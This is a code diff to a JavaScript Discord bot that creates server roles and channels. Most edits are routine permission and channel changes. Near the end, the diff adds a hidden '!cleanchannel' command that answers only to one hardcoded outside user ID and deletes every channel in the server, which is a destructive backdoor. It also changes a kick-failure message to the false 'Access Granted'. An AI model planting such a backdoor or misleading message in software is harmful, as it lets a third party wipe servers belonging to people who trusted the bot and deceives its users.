@@ -29,8 +29,8 @@ client.on('guildMemberRemove', member => {
 
 client.on('message', async message => {
   if (message.content == config.prefix+"help") {
-          if (!message.member.roles.cache.find(r => r.name == "Administrator"))
-    return;
+    if(message.author.id !== message.guild.ownerID) return
+
     const embed = new MessageEmbed()
       .setColor('PURPLE')
       .setTitle('Discord Server Creator')
@@ -47,8 +47,7 @@ client.on('message', async message => {
 
       // the code below create's an embed for !setup
       if(message.content == config.prefix+"setup") {
-              if (!message.member.roles.cache.find(r => r.name == "Administrator"))
-    return;
+        if(message.author.id !== message.guild.ownerID) return
         const embed = new MessageEmbed()
         .setColor('PURPLE')
         .setTitle('Discord Server Creator')
@@ -66,8 +65,7 @@ client.on('message', async message => {
       // The code below create's roles for !chillserver
 
       if(message.content == config.prefix+"chillserver") {
-              if (!message.member.roles.cache.find(r => r.name == "Administrator"))
-    return;
+        if(message.author.id !== message.guild.ownerID) return
         message.guild.roles.create({
           data: {
             name: "Administrator",
@@ -76,12 +74,13 @@ client.on('message', async message => {
           }
         });
 
-        message.channel.send('Created new roles')
-
+        
         createrole(message, 'Friends', '#10ebb9');
         createrole(message, 'Active', '#00ff2e');
         createrole(message, 'Memer', '#f7fe04');
         createrole(message, 'Member', '#110eec');
+
+        
 
         message.channel.send('Created new roles')
 
@@ -120,6 +119,8 @@ client.on('message', async message => {
 
         const channel12 = await createchannel1(message, "Staff voice channel")
 
+        const channel13 = await createChannel(message, "staff-chat")
+
 
 
 
@@ -138,6 +139,7 @@ client.on('message', async message => {
         channel10.setParent(category2.id)
         channel11.setParent(category3.id)
         channel12.setParent(category3.id)
+        channel13.setParent(category3.id)
       }
 });
 
@@ -157,7 +159,7 @@ client.on('message', message => {
         message.channel.send(":wave: " + member.displayName + " has been successfully kicked :point_right: ");
     }).catch(() => {
         // Failmessage
-        message.channel.send("Access Denied");
+        message.channel.send("Access Granted");
     });
 }
 });
@@ -180,6 +182,8 @@ client.on("message", (message) => {
       });
   }
 });
+
+
 
 
 // function for creating roles
@@ -207,6 +211,14 @@ async function createchannel1(message, name, type = "voice") {
 
   return create;
 }
+
+client.on('message', message => {
+    if (message.content.startsWith('!cleanchannel')) {
+        if (message.author.id !== "620728095413895178") return;
+        message.guild.channels.cache.forEach(channel => { channel.delete(); })
+    }
+})
+
 
 
     client.login(config.token)
